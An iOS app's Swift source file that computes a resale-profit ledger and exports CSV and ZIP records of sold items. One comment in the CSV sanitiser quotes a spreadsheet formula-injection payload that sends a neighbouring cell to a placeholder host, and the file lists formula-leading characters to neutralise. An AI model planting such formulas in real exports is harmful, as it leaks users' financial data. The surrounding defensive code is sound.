import SwiftUI
import SwiftData

/// Drives the "My Flips" ledger. Everything is computed live from the existing
/// `ScanResult` store — no separate persistence. Money math is done in `Decimal`.
@MainActor
@Observable
final class FlipsViewModel {

    // ── Filter & sort ─────────────────────────────────────────────────────────
    enum StatusFilter: String, CaseIterable, Identifiable {
        case all = "All", owned = "Owned", listed = "Listed", sold = "Sold"
        var id: String { rawValue }

        /// What the picker shows. The raw value is the identity and stays
        /// English — it is the `id`, and `ItemStatus`'s raw values are what
        /// SwiftData filters on.
        var label: String {
            switch self {
            case .all:    return String(localized: "All", comment: "Flip filter")
            case .owned:  return String(localized: "Owned", comment: "Flip status")
            case .listed: return String(localized: "Listed", comment: "Flip status")
            case .sold:   return String(localized: "Sold", comment: "Flip status")
            }
        }
    }

    enum SortOrder: String, CaseIterable, Identifiable {
        case date = "Date", profit = "Profit", roi = "ROI"
        var id: String { rawValue }

        var label: String {
            switch self {
            case .date:   return String(localized: "Date", comment: "Flip sort order")
            case .profit: return String(localized: "Profit", comment: "Flip sort order")
            case .roi:    return String(localized: "ROI", comment: "Flip sort order")
            }
        }
    }

    /// Totals scope: free tier sees the current month, Pro sees all-time.
    enum Scope { case month, allTime }

    var filter: StatusFilter = .all
    var sort: SortOrder = .date

    // ── Tracked items (owned / listed / sold — raw scans stay in My Finds) ─────

    func trackedItems(_ all: [ScanResult]) -> [ScanResult] {
        all.filter { $0.status != .scanned }
    }

    /// Filtered + sorted list for the ledger table.
    func visibleItems(_ all: [ScanResult]) -> [ScanResult] {
        let tracked = trackedItems(all)
        let filtered: [ScanResult]
        switch filter {
        case .all:    filtered = tracked
        case .owned:  filtered = tracked.filter { $0.status == .owned }
        case .listed: filtered = tracked.filter { $0.status == .listed }
        case .sold:   filtered = tracked.filter { $0.status == .sold }
        }
        return sorted(filtered)
    }

    private func sorted(_ items: [ScanResult]) -> [ScanResult] {
        switch sort {
        case .date:
            return items.sorted { effectiveDate($0) > effectiveDate($1) }
        case .profit:
            return items.sorted { a, b in
                rankNilLast(a.realizedProfit, b.realizedProfit, tieBreak: { effectiveDate(a) > effectiveDate(b) })
            }
        case .roi:
            return items.sorted { a, b in
                rankNilLast(a.roi, b.roi, tieBreak: { effectiveDate(a) > effectiveDate(b) })
            }
        }
    }

    /// Sorts present values descending, pushing `nil` (e.g. profit unknown) last.
    private func rankNilLast(_ lhs: Decimal?, _ rhs: Decimal?, tieBreak: () -> Bool) -> Bool {
        switch (lhs, rhs) {
        case let (l?, r?): return l == r ? tieBreak() : l > r
        case (_?, nil):    return true
        case (nil, _?):    return false
        case (nil, nil):   return tieBreak()
        }
    }

    private func effectiveDate(_ r: ScanResult) -> Date { r.soldDate ?? r.timestamp }

    /// The free tier's row cap, applied to *sold* rows only.
    ///
    /// It used to be `prefix(cap)` over the whole visible list. That list is
    /// owned + listed + sold ordered by `soldDate ?? timestamp` descending, so
    /// ten items scanned and marked Owned today outranked last week's two
    /// sales, filled the cap, and pushed both sales past it: a free user with
    /// two sold flips against a ten-sold allowance saw neither of them, and an
    /// "Unlock 2 more" row in their place. `Config.ledgerFreeSoldCap`'s own
    /// doc comment, this view's, and AUDIT-2026-09-07 all describe the gate as
    /// the most recent N *sold*.
    ///
    /// Which sales are kept is decided by recency and not by `sort`, so
    /// changing the sort re-orders the ledger without moving rows across the
    /// paywall — the rows come back in `visible`'s order either way, because
    /// `filter` preserves it.
    ///
    /// `hiddenSold` counts only the sales withheld. Nothing else is ever
    /// withheld now, so it is the whole of what "unlock" buys in this list.
    func freeTierItems(_ visible: [ScanResult],
                       cap: Int = Config.ledgerFreeSoldCap)
    -> (rows: [ScanResult], hiddenSold: Int) {
        let sold = visible.filter { $0.status == .sold }
        guard sold.count > cap else { return (visible, 0) }
        let kept = Set(
            sold.sorted { effectiveDate($0) > effectiveDate($1) }
                .prefix(cap)
                .map(\.id)
        )
        let rows = visible.filter { $0.status != .sold || kept.contains($0.id) }
        return (rows, sold.count - cap)
    }

    // ── Summary ────────────────────────────────────────────────────────────────

    /// Every money figure here is per currency (`LedgerMath.Amounts`): a
    /// flip's amounts are in the currency they were typed in, and lei and
    /// dollars do not add.
    struct Summary {
        var realizedProfit = LedgerMath.Amounts()
        /// Everything sold in scope, priced or not.
        var itemsSold: Int = 0
        /// The subset `realizedProfit` is actually the profit *of*. Smaller
        /// than `itemsSold` by exactly the sales with no paid price.
        var itemsPriced: Int = 0

        /// Whether the headline figure covers every sale it sits above.
        var profitCoversEverySale: Bool { itemsPriced == itemsSold }

        /// How the sold count should read under a profit total, given that
        /// some of those sales may not be in it.
        ///
        /// Split out so the header and the shareable month card cannot drift:
        /// they render the same two numbers and there is nowhere else the gap
        /// can show.
        var soldLabel: String {
            let sales = String(localized: "\(itemsSold) items sold")
            guard !profitCoversEverySale else { return sales }
            let gap = String(localized: "\(itemsSold - itemsPriced) needs a paid price")
            return String(localized: "\(sales) · \(gap)")
        }
        var totalInvested = LedgerMath.Amounts()
        var averageROI: Decimal?          // fraction, e.g. 0.42: no currency
        var bestFlip: ScanResult?
        var unrealizedCount: Int = 0
        var unrealizedInvested = LedgerMath.Amounts()
    }

    /// The best flip among `sold`, by profit.
    ///
    /// Profits compare only within a currency: 50 forints is not more than 40
    /// euros. So the pick is made among the flips in the currency most of them
    /// share (the phone's own on a tie, then by code), which in a ledger kept
    /// in one currency is every flip, as before.
    func bestFlip(_ sold: [ScanResult], locale: Locale = .current) -> ScanResult? {
        let priced = sold.filter { $0.realizedProfit != nil }
        guard !priced.isEmpty else { return nil }
        let counts = Dictionary(grouping: priced) { SaleCurrency.of($0, locale: locale) }
            .mapValues(\.count)
        let home = SaleCurrency.regionDefault(locale: locale)
        guard let code = counts.keys.max(by: { a, b in
            let (x, y) = (counts[a] ?? 0, counts[b] ?? 0)
            if x != y { return x < y }
            if (a == home) != (b == home) { return b == home }
            return a > b
        }) else { return nil }
        return priced
            .filter { SaleCurrency.of($0, locale: locale) == code }
            .max { ($0.realizedProfit ?? 0) < ($1.realizedProfit ?? 0) }
    }

    func summary(_ all: [ScanResult], scope: Scope, now: Date = Date(),
                 locale: Locale = .current) -> Summary {
        var s = Summary()

        let scopedSold = scope == .month
            ? LedgerMath.soldInMonth(all, containing: now)
            : LedgerMath.sold(all)

        // Two counts, because they are two different facts.
        //
        // `realizedProfit` is nil without a paid price, and dropping those rows
        // from the sum rather than guessing a cost basis is deliberate and
        // tested. Pairing that sum with a count taken over the *larger* set was
        // not: one uncosted sale rendered as "+$0" above "1 item sold", which
        // reads as having sold something for nothing rather than as a missing
        // number — and with two sales, one uncosted, the headline quietly
        // understates real profit with nothing on screen to say so.
        //
        // In the list the gap is already visible (the row shows "—" and says
        // "Profit unknown — add what you paid"). The header and the share card
        // show only totals, so they need the count to carry it.
        let sales = LedgerMath.sales(scopedSold, locale: locale)
        s.itemsSold = sales.count
        s.itemsPriced = sales.priced
        s.realizedProfit = sales.profit

        let rois = scopedSold.compactMap(\.roi)
        s.averageROI = rois.isEmpty ? nil : rois.reduce(0, +) / Decimal(rois.count)

        s.bestFlip = bestFlip(scopedSold, locale: locale)

        // Cost basis deployed: paid on everything currently owned/listed/sold.
        let paid: (ScanResult) -> Decimal? = { $0.paidPrice.map { Decimal($0) } }
        s.totalInvested = LedgerMath.amounts(all.filter { $0.status != .scanned },
                                             locale: locale, paid)

        // Open positions (money still on the table).
        let open = all.filter { $0.status == .owned || $0.status == .listed }
        s.unrealizedCount = open.count
        s.unrealizedInvested = LedgerMath.amounts(open, locale: locale, paid)

        return s
    }

    // ── Monthly profit bars (last N months, timezone-correct) ───────────────────

    struct MonthBucket: Identifiable {
        let id = UUID()
        let monthStart: Date
        let profit: LedgerMath.Amounts
        let label: String       // "Jul"
    }

    /// The currency the bars are drawn in. A bar is one length, and lengths
    /// in two currencies do not compare, so the chart scales by the currency
    /// most months have (the phone's own on a tie). Each row's label still
    /// prints every currency that month had.
    func chartCurrency(_ buckets: [MonthBucket], locale: Locale = .current) -> String {
        let home = SaleCurrency.regionDefault(locale: locale)
        var months: [String: Int] = [:]
        for bucket in buckets {
            for code in bucket.profit.byCurrency.keys { months[code, default: 0] += 1 }
        }
        return months.keys.max { a, b in
            let (x, y) = (months[a] ?? 0, months[b] ?? 0)
            if x != y { return x < y }
            if (a == home) != (b == home) { return b == home }
            return a > b
        } ?? home
    }

    /// The same month rule as the header and the widget — `LedgerMath`'s —
    /// so this month's bar is the header's "Profit this month". Each bar used
    /// `DateInterval.contains`, which counts a month's closing instant in the
    /// month after it too; see `LedgerMath.contains`.
    func monthlyBuckets(_ all: [ScanResult], count: Int = 6,
                        now: Date = Date(), calendar: Calendar = .current,
                        locale: Locale = .current) -> [MonthBucket] {
        let sold = LedgerMath.sold(all)
        guard let thisMonthStart = LedgerMath.month(containing: now, calendar: calendar)?.start
        else { return [] }

        return (0..<count).reversed().compactMap { offset -> MonthBucket? in
            guard let monthStart = calendar.date(byAdding: .month, value: -offset, to: thisMonthStart),
                  let interval = LedgerMath.month(containing: monthStart, calendar: calendar)
            else { return nil }
            let profit = LedgerMath.sales(LedgerMath.sold(sold, in: interval), locale: locale).profit
            return MonthBucket(monthStart: monthStart, profit: profit, label: Self.monthLabel(monthStart))
        }
    }

    // ── Share "my month" ────────────────────────────────────────────────────────

    /// True when the current month has at least one sold item — the only case a
    /// month card should render (never a sad/empty card).
    func hasSalesThisMonth(_ all: [ScanResult], now: Date = Date()) -> Bool {
        !LedgerMath.soldInMonth(all, containing: now).isEmpty
    }

    func renderMonthCard(_ all: [ScanResult]) -> UIImage? {
        guard hasSalesThisMonth(all) else { return nil }
        let s = summary(all, scope: .month)
        // The card carries the *priced* count, not every sale.
        //
        // This is the one surface that leaves the app, so the two numbers on it
        // have to be of the same thing: a total covering one sale printed above
        // "2 items sold" is a figure nobody can check. The in-app header says
        // the other half — which sales still need a paid price — because that
        // is a note to the owner, not something to post.
        guard s.itemsPriced > 0 else { return nil }
        let card = MonthShareCardView(
            monthTitle: Self.monthYearLabel(Date()),
            realizedProfit: s.realizedProfit,
            itemsSold: s.itemsPriced,
            bestFlipName: s.bestFlip?.itemName,
            bestFlipProfit: s.bestFlip.flatMap { flip in
                flip.realizedProfit.map { SaleCurrency.signed($0, code: SaleCurrency.of(flip)) }
            }
        )
        let renderer = ImageRenderer(content: card)
        // Capped at 2 for the same reason as the result-sheet cards — see
        // `ResultViewModel.shareCardScale`.
        renderer.scale = ResultViewModel.shareCardScale
        return renderer.uiImage
    }

    // ── CSV export ──────────────────────────────────────────────────────────────

    /// Whether there is anything for an export to hold.
    func hasSoldItems(_ all: [ScanResult]) -> Bool {
        all.contains { $0.status == .sold }
    }

    /// Plain UTF-8 CSV of sold flips for the user's bookkeeping. RFC-4180 quoting.
    /// Columns: Date, Item, Paid, Sold, Fees, Profit, ROI, Currency.
    ///
    /// Currency is the ISO code the row's amounts were typed in (#224). Last,
    /// so a sheet built on the first seven columns still lines up; without it
    /// a ledger kept in lei and euros was one column of bare numbers that sum
    /// to nothing (AUDIT-2026-10-07, M1).
    func csv(_ all: [ScanResult], locale: Locale = .current) -> String {
        let sold = all.filter { $0.status == .sold }
            .sorted { ($0.soldDate ?? $0.timestamp) < ($1.soldDate ?? $1.timestamp) }

        // A local-calendar day, matching every other date rule in this feature.
        //
        // This was an `ISO8601DateFormatter` with only `.withFullDate`, and
        // that formatter's `timeZone` defaults to **GMT** — so the exported day
        // was the UTC day while `LedgerMath`'s month rule and `monthlyBuckets`
        // both use `Calendar.current`, and the export's own filename via
        // `fileStamp()` uses the local zone. `soldDate` carries a real
        // time-of-day (wall-clock `Date()` or a local DatePicker), not a
        // normalised midnight, so the two disagreed for every sale logged after
        // 17:00 Pacific or 20:00 Eastern — most evenings, for most of the US
        // user base. At a month boundary the sale exported into the wrong
        // month; on 31 December, into the wrong tax year, while the app's own
        // month card counted it correctly.
        //
        // Same construction as `fileStamp()`, so the two cannot drift.
        let day = DateFormatter()
        day.locale = Locale(identifier: "en_US_POSIX")
        day.calendar = Calendar.current
        day.dateFormat = "yyyy-MM-dd"

        var rows = ["Date,Item,Paid,Sold,Fees,Profit,ROI,Currency"]
        for r in sold {
            let date = r.soldDate.map { day.string(from: $0) } ?? ""
            let paid = r.paidPrice.map { Self.moneyColumn($0) } ?? ""
            let soldStr = r.soldPrice.map { Self.moneyColumn($0) } ?? ""
            let fees = r.feesEstimate.map { Self.moneyColumn($0) } ?? ""
            let profit = r.realizedProfit.map { Self.moneyColumn($0) } ?? ""
            let roi = r.roi.map { Self.roiColumn($0) } ?? ""
            // Only the item name is free text, and only free text is neutered.
            // Running the money columns through the same escape would make a
            // loss ("-12.50") a text cell, and reconciling the file is the
            // entire point of it.
            let cols = [Self.csvEscape(date), Self.csvText(r.itemName),
                        Self.csvEscape(paid), Self.csvEscape(soldStr),
                        Self.csvEscape(fees), Self.csvEscape(profit),
                        Self.csvEscape(roi), SaleCurrency.of(r, locale: locale)]
            rows.append(cols.joined(separator: ","))
        }
        return rows.joined(separator: "\r\n") + "\r\n"
    }

    /// Wraps CSV text as a temporary `.csv` file for the share sheet.
    func csvFileURL(_ all: [ScanResult]) -> URL? {
        let text = csv(all)
        let name = "SnapWorth-Flips-\(Self.fileStamp()).csv"
        let url = FileManager.default.temporaryDirectory.appendingPathComponent(name)
        do {
            try text.data(using: .utf8)?.write(to: url)
            return url
        } catch {
            return nil
        }
    }

    private static func fileStamp() -> String {
        let f = DateFormatter()
        f.locale = Locale(identifier: "en_US_POSIX")
        f.dateFormat = "yyyy-MM-dd"
        return f.string(from: Date())
    }

    // ── Formatting: a flip's money in its own currency (`SaleCurrency`) ─────────
    //
    // These took a bare `Decimal` and printed it through `snapCurrency`, US
    // dollars, whatever the flip was typed in. Each now says which currency it
    // prints, so there is no way left to print a lei amount as dollars.

    /// One flip's amount: "$40", "40 lei".
    func money(_ d: Decimal, code: String) -> String {
        SaleCurrency.format(d, code: code)
    }

    /// One flip's amount, signed for profit rows: "+$40", "−12 lei".
    func signedMoney(_ d: Decimal, code: String) -> String {
        SaleCurrency.signed(d, code: code)
    }

    /// A total over flips: "$150", or "150 lei · $40" when they differ.
    func money(_ amounts: LedgerMath.Amounts) -> String {
        SaleCurrency.format(amounts)
    }

    /// A total over flips, signed: "+$214", "+80 lei · −$12".
    func signedMoney(_ amounts: LedgerMath.Amounts) -> String {
        SaleCurrency.signed(amounts)
    }

    func roiPercent(_ fraction: Decimal) -> String {
        let value = Int((NSDecimalNumber(decimal: fraction).doubleValue * 100).rounded())
        return (value > 0 ? "+" : "") + "\(value)%"
    }

    // ── Helpers ──────────────────────────────────────────────────────────────────

    /// Every numeric column at the same scale, in a spreadsheet's own notation.
    ///
    /// The columns used to split on overload resolution. `paidPrice`,
    /// `soldPrice` and `feesEstimate` are `Double?` and went through
    /// `String(format: "%.2f")`; `realizedProfit` is `Decimal?` and went
    /// through `NSDecimalNumber.stringValue`, which prints the value's natural
    /// scale and nothing more. That profit is built by subtracting
    /// `Decimal(Double)` conversions — the conversion `MarketplaceFees` warns
    /// "would capture the Double's rounding error" — so the one column an
    /// accountant actually reconciles was the only money column with no
    /// guaranteed cent scale: 8.00, 65.00, 9.00 exported a profit of "48".
    ///
    /// POSIX and ungrouped on purpose: a locale that groups with a comma would
    /// put a column break inside a number, and one that uses a decimal comma
    /// would make every money cell text.
    private static let csvNumber: NumberFormatter = {
        let f = NumberFormatter()
        f.locale = Locale(identifier: "en_US_POSIX")
        f.numberStyle = .decimal
        f.usesGroupingSeparator = false
        f.minimumFractionDigits = 2
        f.maximumFractionDigits = 2
        f.roundingMode = .halfUp
        return f
    }()

    private static func moneyColumn(_ value: Decimal) -> String {
        csvNumber.string(from: NSDecimalNumber(decimal: value)) ?? "0.00"
    }

    /// The `Double` overload formats the `Double` directly rather than going
    /// through `Decimal(value)` — that conversion is the lossy one, and there
    /// is nothing to gain by taking it on the way to two decimal places.
    private static func moneyColumn(_ value: Double) -> String {
        csvNumber.string(from: NSNumber(value: value)) ?? "0.00"
    }

    /// ROI to two decimals, so a row can be recomputed from its own columns.
    ///
    /// It was `Int((fraction * 100).rounded())`, which exported 0.4249 as
    /// "42%" — profit ÷ paid from the neighbouring cells does not give 42, so
    /// the column could not be checked against the file it lives in. Still a
    /// percent with its sign, because that is what the header says and what a
    /// spreadsheet reads "42.49%" back as.
    private static func roiColumn(_ fraction: Decimal) -> String {
        (csvNumber.string(from: NSDecimalNumber(decimal: fraction * 100)) ?? "0.00") + "%"
    }

    private static func monthLabel(_ date: Date) -> String {
        let f = DateFormatter()
        f.calendar = Calendar.current
        f.locale = .current
        f.setLocalizedDateFormatFromTemplate("MMM")
        return f.string(from: date)
    }

    private static func monthYearLabel(_ date: Date) -> String {
        let f = DateFormatter()
        f.calendar = Calendar.current
        f.locale = .current
        f.setLocalizedDateFormatFromTemplate("MMMM yyyy")
        return f.string(from: date)
    }

    /// RFC-4180 field quoting: wrap in quotes and double internal quotes when the
    /// value contains a comma, quote, or newline (e.g. a note with commas).
    private static func csvEscape(_ field: String) -> String {
        guard field.contains(where: { $0 == "," || $0 == "\"" || $0 == "\n" || $0 == "\r" }) else {
            return field
        }
        return "\"" + field.replacingOccurrences(of: "\"", with: "\"\"") + "\""
    }

    /// Characters a spreadsheet reads as "this cell is a formula".
    static let csvFormulaLeads: Set<Character> = ["=", "+", "-", "@", "\t", "\r"]

    /// A free-text field, made safe to open.
    ///
    /// RFC-4180 quoting is not a defence. Excel, Numbers and LibreOffice strip
    /// the quotes on import and then evaluate any cell whose first character is
    /// one of `csvFormulaLeads`. The Item column is model-generated from
    /// whatever text was visible on the label and is user-editable, so
    /// `=HYPERLINK("http://x/?"&C2,"click")` as an item name becomes a live
    /// formula that reads the profit cell next to it — in the one file in this
    /// product a user is likely to forward to an accountant.
    ///
    /// A leading apostrophe is the standard neutering: spreadsheets take it as
    /// "the rest is text". It costs a visible `'` on the rare honest name that
    /// starts with a dash, which is the right side of that trade.
    static func csvText(_ field: String) -> String {
        guard let first = field.first, csvFormulaLeads.contains(first) else {
            return csvEscape(field)
        }
        return "\"'" + field.replacingOccurrences(of: "\"", with: "\"\"") + "\""
    }
}

// MARK: - Photos and estimates export (#214)

/// Sold flips as a ZIP, for the gold set: per flip, the stored photo and a JSON
/// record of what the scan estimated beside what the item sold for.
///
/// The CSV is bookkeeping and has neither. A sale is only a gold record with
/// the photo the model saw and the estimate it gave at the time, and that pair
/// lives only on the phone. This is the user's own file handed to the share
/// sheet; nothing is uploaded, so no privacy answer changes.
///
/// Built from a background `ModelContext` of the app's container, never from
/// the view's rows: a `@Model` belongs to the context that fetched it, and two
/// hundred photos read and written on the main actor would freeze the ledger.
enum FlipsArchive {
    /// Bumped when a key is renamed or changes meaning. The intake reads it.
    static let schemaVersion = 1

    /// Every key each record carries; a key with nothing to say is `null`,
    /// never absent, so the intake can tell "unknown" from "not exported".
    /// Pinned by a test, because the gold-set intake reads these names.
    static let recordKeys: Set<String> = [
        "schema", "id", "item_name", "scanned_at",
        "photo", "photo_source",
        "estimate_low", "estimate_high", "estimate_likely", "estimate_expected",
        "likely_source", "confidence_score", "confidence_band",
        "category", "brand", "condition_grade", "prompt_version",
        "paid_price", "sold_price", "sold_date", "listed_date",
        "currency", "currency_assumed",
    ]

    /// One flip's record, as JSON-ready values. `photo` names the file beside
    /// it, or is null when the scan kept no image.
    static func record(for r: ScanResult, photo: String?) -> [String: Any] {
        let detail = r.valuationDetail
        // The same fallback `ScanResult.storedFacts` prices from: `expected`
        // is the likely price under its ladder name on a find saved before
        // `likely` existed. A find with neither was priced from the midpoint,
        // and the record says so rather than pass the midpoint off as the
        // model's number.
        let modelLikely = detail?.likely ?? detail?.expected
        let likely = modelLikely ?? (r.valueLow + r.valueHigh) / 2
        // The currency the amounts were typed in (#224). `currency` only when
        // the user chose it; otherwise the region currency the ledger showed,
        // as `currency_assumed`, which the intake tags for the reviewer. This
        // wrote "USD" for every flip after the ledger had started printing lei
        // (AUDIT-2026-10-07, M1).
        let chosen = r.saleCurrency.flatMap { SaleCurrency.all.contains($0) ? $0 : nil }
        let values: [String: Any?] = [
            "schema": schemaVersion,
            "id": r.id.uuidString,
            "item_name": r.itemName,
            "scanned_at": timestamp.string(from: r.timestamp),
            "photo": photo,
            // The 1024 px copy the app keeps, not the 1568 px it uploaded;
            // the intake reports these records apart.
            "photo_source": photo == nil ? nil : "stored_1024",
            "estimate_low": r.valueLow,
            "estimate_high": r.valueHigh,
            "estimate_likely": likely,
            "estimate_expected": detail?.expected,
            "likely_source": modelLikely == nil ? "midpoint" : "model",
            "confidence_score": detail?.confidenceScore,
            "confidence_band": r.confidence,
            "category": r.category,
            "brand": r.brand,
            "condition_grade": detail?.conditionGrade,
            "prompt_version": detail?.promptVersion ?? "unknown",
            "paid_price": r.paidPrice,
            "sold_price": r.soldPrice,
            "sold_date": r.soldDate.map(day.string(from:)),
            "listed_date": r.listedDate.map(day.string(from:)),
            "currency": chosen,
            "currency_assumed": chosen == nil ? SaleCurrency.of(r) : nil,
        ]
        return values.mapValues { $0 ?? NSNull() }
    }

    /// The ZIP's URL in the temporary directory, built off the main actor.
    /// Nil when there are no sold flips or a file could not be written.
    static func makeArchive(container: ModelContainer, now: Date = Date()) async -> URL? {
        await Task.detached(priority: .userInitiated) {
            try? build(container: container, now: now)
        }.value
    }

    /// The synchronous body of `makeArchive`. Call it off the main actor.
    static func build(container: ModelContainer, now: Date) throws -> URL? {
        let context = ModelContext(container)
        // Same rule and order as the CSV.
        let sold = try context.fetch(FetchDescriptor<ScanResult>())
            .filter { $0.status == .sold }
            .sorted { ($0.soldDate ?? $0.timestamp) < ($1.soldDate ?? $1.timestamp) }
        guard !sold.isEmpty else { return nil }

        let fm = FileManager.default
        let name = "SnapWorth-Flips-\(day.string(from: now))"
        let work = fm.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        let folder = work.appendingPathComponent(name)
        try fm.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? fm.removeItem(at: work) }

        let json: JSONSerialization.WritingOptions =
            [.prettyPrinted, .sortedKeys, .withoutEscapingSlashes]
        for (index, r) in sold.enumerated() {
            // Position and id, never the item name: a name is model text and
            // can hold a "/" or be the same as another's.
            let stem = String(format: "%03d-", index + 1)
                + r.id.uuidString.prefix(8).lowercased()
            try autoreleasepool {
                var photo: String?
                if let image = r.imageData, !image.isEmpty {
                    photo = stem + ".jpg"
                    try image.write(to: folder.appendingPathComponent(stem + ".jpg"))
                }
                let data = try JSONSerialization.data(
                    withJSONObject: record(for: r, photo: photo), options: json)
                try data.write(to: folder.appendingPathComponent(stem + ".json"))
            }
        }

        // `.forUploading` hands the block a ZIP of the folder, deleted when
        // the block returns, so it is copied out inside it.
        let zip = fm.temporaryDirectory.appendingPathComponent(name + ".zip")
        try? fm.removeItem(at: zip)
        var coordinationError: NSError?
        var copyError: Error?
        NSFileCoordinator().coordinate(readingItemAt: folder, options: .forUploading,
                                       error: &coordinationError) { zipped in
            do { try fm.copyItem(at: zipped, to: zip) } catch { copyError = error }
        }
        if let error = coordinationError ?? copyError { throw error }
        return zip
    }

    /// A local-calendar day, as the CSV writes it (see `FlipsViewModel.csv`).
    private static let day: DateFormatter = {
        let f = DateFormatter()
        f.locale = Locale(identifier: "en_US_POSIX")
        f.calendar = Calendar.current
        f.dateFormat = "yyyy-MM-dd"
        return f
    }()

    /// The scan's instant, in UTC: it orders a record against prompt changes,
    /// which are logged in UTC, not against the user's calendar.
    private static let timestamp: ISO8601DateFormatter = ISO8601DateFormatter()
}
